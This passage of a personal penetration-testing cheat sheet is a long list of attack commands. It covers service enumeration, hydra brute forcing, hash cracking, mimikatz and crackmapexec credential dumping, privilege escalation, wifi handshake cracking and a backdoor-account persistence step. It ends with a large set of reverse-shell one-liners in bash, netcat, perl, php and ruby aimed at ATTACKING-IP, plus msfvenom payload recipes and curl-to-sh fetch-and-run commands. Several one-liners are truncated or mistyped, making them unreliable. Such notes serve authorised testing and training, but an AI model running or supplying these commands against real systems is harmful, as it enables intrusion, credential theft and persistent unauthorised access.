- Retrieve message

```bash
QUIT
```

```bash
quits
```

RPC (135)
------------------------------------------------------------

```bash
rpcclient --user="" --command=enumprivs -N $ip #Connect to an RPC share without a username and password and enumerate privledges
rpcclient --user="<Username>" --command=enumprivs $ip #Connect to an RPC share with a username and enumerate privledges
```

RPCBind (111):
------------------------------------------------------------

```bash
rpcinfo ‚Äìp x.x.x.x
```

SMB\RPC Enumeration (139/445):
------------------------------------------------------------

```bash
smbmap -H 10.10.10.149
```

```bash
smbclient -L \\\\10.0.0.100\\
smbclient \\\\10.0.0.100\\Replication
prompt off #doesnt prompt of us downloading
recurse on` #download all the files
mget *` #download all files in this share

```

```bash
enum4linux -a 10.0.0.1 #Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing
```

```bash
nbtscan x.x.x.x #Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain
```

```bash
ridenum.py 192.168.XXX.XXX 500 50000 dict.txt
```

```bash
python /home/hasamba/tools/impacket/build/scripts-3.8/samrdump.py 192.168.XXX.XXX
```

```bash
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse $IP
```

smb4k on Kali, useful Linux GUI for browsing SMB shares

```bash
apt-get install smb4k -y
```

- on Windows:
- Download All Files From A Directory Recursively

```bash
smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'
```

```bash
net use \\TARGET\IPC$ "" /u:"" #Manual Null session testing
```

SNMP Enumeration (161):
------------------------------------------------------------

- Fix SNMP output values so they are human readable:

```bash
apt-get install snmp-mibs-downloader download-mibs
echo "" > /etc/snmp/snmp.conf
```

```bash
snmpwalk -c public -v1 192.168.1.X 1| 
 grep hrSWRunName|cut -d* * -f
```

```bash
snmpcheck -t 192.168.1.X -c public
```

```bash
onesixtyone -c names -i hosts
```

```bash
nmap -sT -p 161 192.168.X.X -oG snmp_results.txt
nmap -n -vv -sV -sU -Pn -p 161,162 ‚Äìscript=snmp-processes,snmp-netstat IP
```

```bash
snmpenum -t 192.168.1.X
```

```bash
onesixtyone -c names -i hosts
```

```bash
#metasploit
    auxiliary/scanner/snmp/snmp_enum
    auxiliary/scanner/snmp/snmp_enum_hp_laserjet
    auxiliary/scanner/snmp/snmp_enumshares
    auxiliary/scanner/snmp/snmp_enumusers
    auxiliary/scanner/snmp/snmp_login
```

Oracle (1521):
------------------------------------------------------------

```bash
tnscmd10g version -h INSERTIPADDRESS
```

```bash
tnscmd10g status -h INSERTIPADDRESS
```

LDAP (389)
------------------------------------------------------------

[JXplorer - an open source LDAP browser](http://jxplorer.org/)

MSSQL (1433)
------------------------------------------------------------

```bash
nmap -n -v -sV -Pn -p 1433 ‚Äìscript ms-sql-brute ‚Äìscript-args userdb=users.txt,passdb=passwords.txt IP
nmap -n -v -sV -Pn -p 1433 ‚Äìscript ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password IP
```

[Hunting for MSSQL | Offensive Security](https://www.offensive-security.com/metasploit-unleashed/hunting-mssql/)

Mysql Enumeration (3306):
------------------------------------------------------------

```bash
nmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122

mysql ‚Äìh IP -u root -p
show databases;
show tables;
use tablename;
describe table;
select table1, table2 from tablename;
```

Active Directory
------------------------------------------------------------

```bash
# current domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# domain trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# current forest info
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# get forest trust relationships
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()

# get DCs of a domain
nltest /dclist:offense.local
net group "domain controllers" /domain

# get DC for currently authenticated session
nltest /dsgetdc:offense.local

# get domain trusts from cmd shell
nltest /domain_trusts

# get user info
nltest /user:"spotless"

# get DC for currently authenticated session
set l

# get domain name and DC the user authenticated to
klist

# get all logon sessions. Includes NTLM authenticated sessions
klist sessions

# kerberos tickets for the session
klist

# cached krbtgt
klist tgt

# whoami on older Windows systems
set u

# find DFS shares with ADModule
Get-ADObject -filter * -SearchBase "CN=Dfs-Configuration,CN=System,DC=offense,DC=local" | select name

# find DFS shares with ADSI
$s=[adsisearcher]'(name=*)'; $s.SearchRoot = [adsi]"LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local"; $s.FindAll() | % {$_.properties.name}

# check if spooler service is running on a host
powershell ls "\\dc01\pipe\spoolss"
```

MSSQL
------------------------------------------------------------

Try using "Browse for More" via MS SQL Server Management Studio

Enumeration / Discovery:

Nmap:

```bash
nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
```

Metasploit:

```bash
msf > use auxiliary/scanner/mssql/mssql_ping
```

Bruteforce MSSQL Login
------------------------------------------------------------

```bash
msf > use auxiliary/admin/mssql/mssql_enum
```

Metasploit MSSQL Shell
------------------------------------------------------------

```bash
msf > use exploit/windows/mssql/mssql_payload
msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
```

Gaining Access
------------------------------------------------------------

- hydra: bruteforce tool

    ```bash
    hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.101 -t 4 -v -f
    #-l is the user we want to attack, -P password file list, -t threads, -v verbose
    #it's better to intercept the login page with burp, check to see the correct username&password syntax and copy the exact failed message
    -#f   exit when a login/pass pair is found
    hydra -l hasamba -P ~/Desktop/test_passwords.txt 10.0.0.210 -s 8085 http-post-form "/login/:username=^USER^&password=^PASS^:F=Authentication failed" -VVV -t 6 -
    hydra OPT #will show us optional moduls for http and such
    hydra -U MODULE_NAME #will show module examples

    hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V #Hydra FTP brute force
    hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V #Hydra POP3 brute force
    hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V #Hydra SMTP brute force

    hydra -l username -P password-list <URL_TO_SERVER> http-post-form "<PATH-TO_LOGIN>:POST_REQUEST_FOR_LOGIN:FAILED_RESPONSE_IDENTIFIER"
    ```

- metasploit - can also bruteforce

    ```bash
    use auxialary/scanner/ssh/ssh_login
    options
    set username root
    set pass_file /usr/share...
    set rhosts
    set threads 10
    set verbose true
    run
    ```

- unshadow (kali) - combine both files and will insert the hashed passwords to the passwd file, so we can use this file with hashcat to maybe decrypt the password.

    ```bash
    unshadow PASSSWD_FILE SHADOW_FILE
    ```

- [hashcat](https://www.notion.so/Hashcat-b885f8ac8c0f450986d62c0d29f44cb9) - crack passwords hashes ([Cheat Sheet](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/a44ab748-a9a9-437e-a4a1-2fa1cc6c03a8/HashcatCheatSheet.v2018.1b.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20201122%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20201122T190235Z&X-Amz-Expires=86400&X-Amz-Signature=03753b73d70b97901e6a764011ae5ffdbffc2d9dcbd00673f79b64097b1299d9&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22HashcatCheatSheet.v2018.1b.pdf%22))

    ```bash
    hashcat -m "OSCODE" unshadow.txt passwordFile.txt
    #from here: https://github.com/frizb/Hashcat-Cheatsheet
    hashcat --force -m300 --status -w3 -o found.txt --remove --potfile-disable -r rules\OneRuleToRuleThemAll.rule hash.txt rockyou.txt
    ```

- hash-identifier

    ```bash
    hash-identifier [hash]
    ```

- [name-that-hash](https://github.com/HashPals/Name-That-Hash) - better hash analyzer

    ```jsx

    ```

- cewl - create wordlist from a website

    ```bash
    cewl  -v --with-numbers -e --email_file cewl_email.wordlist -w cewl.wordlist http://sneakycorp.htbme

    #my favorite rule to add:
    john --wordlist=wordlist.txt --rules=jumbo --stdout > wordlist-modified.txt

    hashcat --force cewl.wordlist -r /usr/share/hashcat/rules/best64.rule --stdout > hashcat_words

    https://github.com/praetorian-inc/Hob0Rules
    ###hob064 This ruleset contains 64 of the most frequent password patterns
    hashcat -a 0 -m 1000 <NTLMHASHES> wordlists/rockyou.txt -r hob064.rule -o cracked.txt

    ###d3adhob0 This ruleset is much more extensive and utilizes many common password structure ideas
    hashcat -a 0 -m 1000 <NTLMHASHES> wordlists/english.txt -r d3adhob0.rule -o cracked.txt

    #adding John rules
    john --wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt
    john --wordlist=wordlist.txt --rules=best64 --stdout > wordlist-modified.txt
    ```

- john the ripper - password cracker ([cheat sheet](https://drive.google.com/viewerng/viewer?url=https://countuponsecurity.files.wordpress.com/2016/09/jtr-cheat-sheet.pdf)) ([Jumbo community version](https://github.com/openwall/john))

    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
    #after john finished, ask him to show
    john hashes.txt --show

    john 127.0.0.1.pwdump --wordlist=dictionary.txt --rules=Jumbo #with jumbo rules from https://github.com/openwall/john
    ```

    [CyberChef](https://gchq.github.io/CyberChef/)

    [CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/)

    [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/)

    [Cipher Identifier (online tool) | Boxentriq](https://www.boxentriq.com/code-breaking/cipher-identifier)

- msfvenom(kali) - tool to create malware

    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOSTS=10.10.10.14 LPORT=4444 -f aspx > ex.aspx

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
    ```

- [responder (imapcket)](https://www.notion.so/responder-imapcket-b7bdbbb91ce74e98834dd88ec1715528) - MITM - listening in the background and wait for a failed dns request

    ```bash
    responder -I eth0 -rdwv #Run Responder.py for the length of the engagement while you're working on other attack vectors.
    ```

Post Exploitation
------------------------------------------------------------

Useful commands running locally on the Linux system To quickly analyze the system and possibly help to escalate privileges
------------------------------------------------------------

- whoami - shows the user we logged in with
- history - show last history, it usually can show any password or personal stuff the user execute
- sudo -l - show what programs we can run without sudo, check all process against [GTFOBins](https://gtfobins.github.io/)
    - if we get `(ALL, !root) /bin/bash`, we can exploit with [this](https://www.exploit-db.com/exploits/47502)
- uname -a - will show us the linux version so we can search for a script that will escalate privileges
- export - check system variables
- processes

    ```bash
    ps -ef
    ps auxf
    ps auxfww
    ```

- find in files

    ```bash
    find . -name "*.java" -type f -exec fgrep -iHn "textToFind" {} \;
    find . -regex ".*\.\(c\|java\)" -type f -exec fgrep -iHn "textToFind" {} \;
    find / -maxdepth 4 -name *.conf -type f -exec grep -Hn "textToFind" {} \; 2>/dev/null
    # SUID files owned by root
    find / -uid 0 -perm -4000 -type f 2>/dev/null
    # SUID files owned by root and world readable
    find / -uid 0 -perm -u=s,o=r -type f -exec ls -la {} \; 2> /dev/null
    # SUID files
    find / -perm -4000 -type f 2>/dev/null
    # world writable directories
    find / -perm -2 -type d 2>/dev/null

    #find passwords in files and ignore errors and filter out the proc and other folders
    find . ! -path "*/proc/*" -type f -name "*" -exec fgrep -iHn password {} \;
    find . -type f \( -iname \*.conf -o -iname \*.cfg -o -iname \*.xml -o -iname \*.ini -o -iname \*.json -o -iname \*.sh -o -iname \*.pl -o -iname \*.py \) -exec fgrep -iHn password {} \; 2> /dev/null

    # find using several patterns read from file (patterns are delimited by new line)
    find . -type f -exec grep -iHFf patterns.txt {} \;

    # find password keyword in small files
    find . -type f -size -512k -exec fgrep -iHn password {} \;

    # reverse java jar files and find passwords there
    find . -name "*.jar" -type f -exec ~/jd-cli/jd-cli -oc -l -n -st {} \; | egrep -i -e "Location:" -e "password" | uniq
    ```

```bash
# check open ports and services listening
netstat -anp

# check defined hosts
cat /etc/hosts

# check local IP addresses and interfaces
ifconfig -a

# check route
route -v

# check filesystem
df

# check sudo privileges
sudo -l

# check crontab
crontab -l

# check inittab
cat /etc/inittab

# try to sniff traffic
tcpdump
tcpdump -s0 not port 22 -w trace.pcap

# check known hosts
cat ~/.ssh/known_hosts

# try access mails
head /var/mail/root

# list groups, users
cat /etc/group
cat /etc/passwd
# with root privileges
cat /etc/shadow

# check shared memory
ipcs -mp

# logout
logout

# close script session
Ctrl + D
```

Scripts
------------------------------------------------------------

- [pwncat](https://github.com/calebstewart/pwncat) - pwncat is a post-exploitation platform for Linux targets

    ```bash
    cd ~/tools
    source pwncat-env/bin/activate

    # Connect to a bind sheql
    pwncat connect://10.10.10.10:4444
    pwncat 10.10.10.10:4444
    pwncat 10.10.10.10 4444
    # Listen for reverse shell
    pwncat bind://0.0.0.0:4444
    pwncat 0.0.0.0:4444
    pwncat :4444
    pwncat -lp 4444
    # Connect via ssh
    pwncat ssh://user:password@10.10.10.10
    pwncat user@10.10.10.10
    pwncat user:password@10.10.10.10
    pwncat -i id_rsa user@10.10.10.10
    # SSH w/ non-standard port
    pwncat -p 2222 user@10.10.10.10
    pwncat user@10.10.10.10:2222
    # Reconnect utilizing installed persistence
    #   If reconnection failes and no protocol is specified,
    #   SSH is used as a fallback.
    pwncat reconnect://user@10.10.10.10
    pwncat reconnect://user@c228fc49e515628a0c13bdc4759a12bf
    pwncat user@10.10.10.10
    pwncat c228fc49e515628a0c13bdc4759a12bf
    pwncat 10.10.10.10

    ^D
    run enumerate.gather

    run escalate.auto exec

    ---OLD---

    upload/download --help

    persist --help
    persist --install
    perist --status
    persist --clean

    tamper --help

    busybox --install

    enum --help
    enum --show --type sudo
    enum --report enumaration.md

    privsec --help
    privsec -l
    privsec --escalate
    privsec -e -u sysadmin
    ```

- [sherlock](https://github.com/rasta-mouse/Sherlock) - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.
- [windows exploit suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) - This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.
- metasploit migrate process and search suggester

    ```bash
    ps
    migrate 1788
    search suggester
    ```

- [psexec](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/psexec%20d818d32588314cb68f8ca3db57a6e1ef.md), wmiexec.py or [smbexec.py](http://smbexec.py) - privilege escalation for windows
- [powershellempire](https://github.com/PowerShellEmpire/PowerTools) - windows privilege escalation

    ```bash
    powershell -ep (ExecutionPolicy) bypass
    . .\PowerView.ps1
    Get-NetDomain
    Get-NetDomainController
    Get-DomainPolicy
    (Get-DomainPolicy)."system access"
    Get-NetUser
    Get-NetUser | select cn /samaccountname/description
    Get-UserProperty -Properties pwdlastset/logoncount/badpwdcount
    Get-NetComputer -FullData(extra data) | select(like grep) OperatingSystem
    Get-NetGroupMember -GroupName "Domain Admins"
    Invoke-ShareFinder
    Get-NetGPO | select displayname, whenchanged

    ```

- [bloodhound](https://github.com/BloodHoundAD/BloodHound) - easily identify highly complex attack paths
- crackmapexec - can take passwords or hashes that we found and check them against all computers on a network

    ```powershell
    crackmapexec 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1
    #Spray the network with local login credentials then dump SAM contents
    crackmapexec smb 10.0.0.1/24 -u administrator -p 'password' --local-auth --sam
    #Pass the hash network-wide, local login, dump LSA contents
    crackmapexec smb 10.0.0.1/24 -u administrator -H <hash> --local-auth --lsa

    ```

- [secretsdump.py](http://secretsdump.py) (impacket) - dumps hashes for known user/password

    ```powershell
    secretsdump.py marvel/fcastle:Pssword1@192.168.4.4
    ```

- [incognito (meterpeter)](https://www.notion.so/incognito-meterpeter-881379ef297d4b3f8b50745428e1e8ed) - can impersonate a user
- [GetUserSPNs.py](http://getuserspns.py) (impacket)

    ```bash
    GetUserSpns.py marvel.local/fcastle:Password1 -dc-ip 192.168.57.140 -request
    ```

- [mimikatz](https://github.com/gentilkiwi/mimikatz) - can extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets

    ```bash
    mimikatz
    privilege::debug` (allow us to bypass several protections)
    sekurlsa::logonpasswords` show us all users login from reboot, we can pass the hash or crack them, we can search for `wdigest` until windows8 including windows7 the passoword stored in plain text, from windows8 microsoft turned it off, we can turn it on from mimikatz and wait for a user to login
    lsadump::sam` dumps the SAM
    lsadump::lsa /patch` dumps Local Security Authority
    lsadump::lsa /inject /name:krbtgt`
    kerberos::golden /User:Administrator(doesnt matter, can be fake) /domain:marvel.local /sid:SID /krbtgt:NTLM /id:500(your RID) /ptt(pass the ticket to our next session)`
    misc::command` (gives us command prompt with full privilege)
    ```

Privilige Escalation ([alot of resources](https://github.com/coreb1t/awesome-pentest-cheat-sheets#privilege-escalation))
------------------------------------------------------------

[Linux privilege escalation](https://jok3rsecurity.wordpress.com/linux-privilege-escalation/)

[Linux Privilege Escalation CheatSheet for OSCP - ByteFellow](https://www.bytefellow.com/linux-privilege-escalation-cheatsheet-for-oscp/)

[windows privilege escalation](https://jok3rsecurity.wordpress.com/windows-privilege-escalation/)

[Windows Privilege Escalation Cheatsheet for OSCP - ByteFellow](https://www.bytefellow.com/windows-privilege-escalation-cheatsheet-for-oscp/)

[C0nd4/OSCP-Priv-Esc](https://github.com/C0nd4/OSCP-Priv-Esc)

Linux:
------------------------------------------------------------

Find Binaries that will execute as the owner

```bash
find / -perm -u=s -type f 2>/dev/null
```

Find binaries that will execute as the group

```bash
find / -perm -g=s -type f 2>/dev/null
```

Find sticky-bit binaries

```bash
find / -perm -1000 -type d 2>/dev/null
```

If Python is executable as root

```bash
python2.7 -c "import pty;pty.spawn('/bin/sh');"
```

- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) - Linux Privilege Escalation Awesome Script

```bash
#From github
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh

#Local network
sudo python -m SimpleHTTPServer 80
curl 10.10.10.10/linpeas.sh | sh

#Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh
cat < /dev/tcp/10.10.10.10/80 | sh

#Output to file
linpeas -a > /dev/shm/linpeas.txt
less -r /dev/shm/linpeas.txt #Read with colors
```

- [LinEnum](https://github.com/rebootuser/LinEnum)

```bash
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
    #-k Enter keyword
    #-e Enter export location
    #-t Include thorough (lengthy) tests
    #-s Supply current user password to check sudo perms (INSECURE)
    #-r Enter report name
    #-h Displays this help text
```

[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[https://github.com/pentestmonkey/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)

Windows:
------------------------------------------------------------

```powershell
#after getting a low privilege shell
systeminfo
#copy the result to systeminfo.txt
python2 ~/tools/Windows-Exploit-Suggester/windows-exploit-suggester.py --update
python2 ~/tools/Windows-Exploit-Suggester/windows-exploit-suggester.py --systeminfo systeminfo.txt --database [DB].xls
```

[https://github.com/pentestmonkey/windows-prive](https://github.com/pentestmonkey/windows-privesc-check)

[sc-check](https://github.com/pentestmonkey/windows-privesc-check)

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)

[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)

Maintain Access
------------------------------------------------------------

- metasploit

    ```bash
    persistence -h
    OR
    exploit/windows/local/persistence
    OR
    net user hacker password123 /add
    ```

Wireless Penetration
------------------------------------------------------------

- airmon-ng, airodump-ng, aircrack-ng - crack wifi networks

    ```bash
    iwconfig #show wireless cards, check after connecting the wireless card to the vm machine in options
    airmon-ng check kill #will kill process that intruppt
    airmon-ng start wlan0 #starts monitor mode on the card
    iwconfig #will assure that we are in monitor mode
    airodump-ng wlan0mon #check for avaliable networks, PWR show the closer network, the smallest number is the closest
    airodump-ng -c 6 --bssid MAC -w capture wlan0mon #will capture data from the specific MAC address of the network we want, 6 is the channel number of the network

    #we are waiting to capture the handshake, it will written in the header
    #we can make it faster by DEAUTH which means kicking a connected user and while he re-auth we will capture the handshake
    #in a new terminal:
    aireplay-ng -0 1 -a MAC_OF_THE_NETWORK -c MAC_OF_THE_STATION_CONNECTED wlan0mon
    ls capture*
    aircrack-ng -w wordlist.txt -b MAC_OF_THE_NETWORK CAPTUREFILE #could be done also with hashcat
    #phone numbers are very common as a password

    ```

Shells & Reverse Shells
------------------------------------------------------------

SUID C Shells
------------------------------------------------------------

- bin/bash:

```
int main(void){

setresuid(0, 0, 0);

system("/bin/bash");

}
```

- bin/sh:

```
int main(void){

setresuid(0, 0, 0);

system("/bin/sh");

}
```

TTY Shell:
------------------------------------------------------------

```bash
python -c 'import pty;pty.spawn("/bin/bash")' #Python TTY Shell Trick
```

```bash
echo os.system('/bin/bash')
```

```bash
/bin/sh ‚Äìi #Spawn Interactive sh shell
```

```bash
execute('/bin/sh')
```

- LUA

```bash
!sh
```

- Privilege Escalation via nmap

```bash
:!bash
```

- Privilege escalation via vi

Fully Interactive TTY
------------------------------------------------------------

```
                                In reverse shell 
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
                                In Attacker console
stty -a
stty raw -echo
fg
                                In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

Spawn Ruby Shell
------------------------------------------------------------

```bash
exec "/bin/sh"
```

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d
```

Netcat
------------------------------------------------------------

```bash
nc -e /bin/sh ATTACKING-IP 80
```

```bash
/bin/sh | nc ATTACKING-IP 80
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
```

Telnet Reverse Shell
------------------------------------------------------------

```bash
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
```

```bash
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```

PHP
------------------------------------------------------------

```bash
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
```

- (Assumes TCP uses file descriptor 3. If it doesn‚Äôt work, try 4,5, or 6)

Bash
------------------------------------------------------------

```bash
exec /bin/bash 0&0 2>&0
```

```bash
0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
```

```bash
exec 5<>/dev/tcp/ATTACKING-IP/80 cat <&5 | while read line; do $line 2>&5 >&5; done
```

```bash
# or: while read line 0<&5; do $line 2>&5 >&5; done
```

```bash
bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
```

Perl
------------------------------------------------------------

```bash
exec "/bin/sh";
```

```bash
perl ‚Äîe 'exec "/bin/sh";'
```

```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```bash
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

- Windows

```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

- 

Meterpreter (Metasploit) ([cheet sheet](https://www.tunnelsup.com/metasploit-cheat-sheet/))
------------------------------------------------------------

Windows reverse meterpreter payload
------------------------------------------------------------

```bash
set payload windows/meterpreter/reverse_tcp
```

- Windows reverse tcp payload

Windows VNC Meterpreter payload
------------------------------------------------------------

```bash
set payload windows/vncinject/reverse_tcpf
```

- Meterpreter Windows VNC Payload

```bash
set ViewOnly false
```

Linux Reverse Meterpreter payload
------------------------------------------------------------

```bash
set payload linux/meterpreter/reverse_tcp
```

- Meterpreter Linux Reverse Payload

Meterpreter Cheat Sheet
------------------------------------------------------------

```bash
upload file c:\\windows
```

- Meterpreter upload file to Windows target

```bash
download c:\\windows\\repair\\sam /tmp
```

- Meterpreter download file from Windows target

```bash
download c:\\windows\\repair\\sam /tmp
```

- Meterpreter download file from Windows target

```bash
execute -f c:\\windows\temp\exploit.exe
```

- Meterpreter run .exe on target ‚Äì handy for executing uploaded exploits

```bash
execute -f cmd -c
```

- Creates new channel with cmd shell

```bash
ps
```

- Meterpreter show processes

```bash
shell
```

- Meterpreter get shell on the target

```bash
getsystem
```

- Meterpreter attempts priviledge escalation the target

```bash
hashdump
```

- Meterpreter attempts to dump the hashes on the target (must have privileges; try migrating to winlogon.exe if possible first)

```bash
portfwd add ‚Äìl 3389 ‚Äìp 3389 ‚Äìr target
```

- Meterpreter create port forward to target machine

```bash
portfwd delete ‚Äìl 3389 ‚Äìp 3389 ‚Äìr target
```

- Meterpreter delete port forward

```bash
use exploit/windows/local/bypassuac
```

- Bypass UAC on Windows 7 + Set target + arch, x86/64

```bash
use auxiliary/scanner/http/dir_scanner
```

- Metasploit HTTP directory scanner

```bash
use auxiliary/scanner/http/jboss_vulnscan
```

- Metasploit JBOSS vulnerability scanner

```bash
use auxiliary/scanner/mssql/mssql_login
```

- Metasploit MSSQL Credential Scanner

```bash
use auxiliary/scanner/mysql/mysql_version
```

- Metasploit MSSQL Version Scanner

```bash
use auxiliary/scanner/oracle/oracle_login
```

- Metasploit Oracle Login Module

```bash
use exploit/multi/script/web_delivery
```

- Metasploit powershell payload delivery module

```bash
post/windows/manage/powershell/exec_powershell
```

- Metasploit upload and run powershell script through a session

```bash
use exploit/multi/http/jboss_maindeployer
```

- Metasploit JBOSS deploy

```bash
use exploit/windows/mssql/mssql_payload
```

- Metasploit MSSQL payload

```bash
run post/windows/gather/win_privs
```

- Metasploit show privileges of current user

```bash
use post/windows/gather/credentials/gpp
```

- Metasploit grab GPP saved passwords

```bash
load kiwi
```

```bash
creds_all
```

- Metasploit load Mimikatz/kiwi and get creds

```bash
run post/windows/gather/local_admin_search_enum
```

- Idenitfy other machines that the supplied domain user has administrative access to

```bash
set AUTORUNSCRIPT post/windows/manage/migrate
```

Meterpreter Payloads
------------------------------------------------------------

```bash
msfvenom ‚Äìl
```

- List options

Binaries
------------------------------------------------------------

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf
```

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe
```

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho
```

Web Payloads
------------------------------------------------------------

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -f raw > shell.php
```

- PHP

```bash
set payload php/meterpreter/reverse_tcp
```

- Listener

```bash
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

- PHP

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp
```

- ASP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp
```

- JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
```

- WAR

Scripting Payloads
------------------------------------------------------------

```bash
msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py
```

- Python

```bash
msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh
```

- Bash

```bash
msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
```

- Perl

Shellcode
------------------------------------------------------------

For all shellcode see ‚Äòmsfvenom ‚Äìhelp-formats‚Äô for information as to
valid parameters. Msfvenom will output code that is able to be cut and
pasted in this language for your exploits.

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f
```

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f
```

```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f
```

Handlers
------------------------------------------------------------

Metasploit handlers can be great at quickly setting up Metasploit to
be in a position to receive your incoming shells. Handlers should be in
the following format.

```
exploit/multi/handler set PAYLOAD set LHOST set LPORT set ExitOnSession false exploit -j -z
```

An example is:

```
msfvenom exploit/multi/handler -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f > exploit.extension
```

Powershell
------------------------------------------------------------

Execution Bypass
------------------------------------------------------------

```bash
Set-ExecutionPolicy Unrestricted
./file.ps1
```

```bash
Import-Module script.psm1
Invoke-FunctionThatIsIntheModule
```

```bash
iex(new-object system.net.webclient).downloadstring(‚Äúfile:///C:\examplefile.ps1‚Äù)
```

Powershell.exe blocked
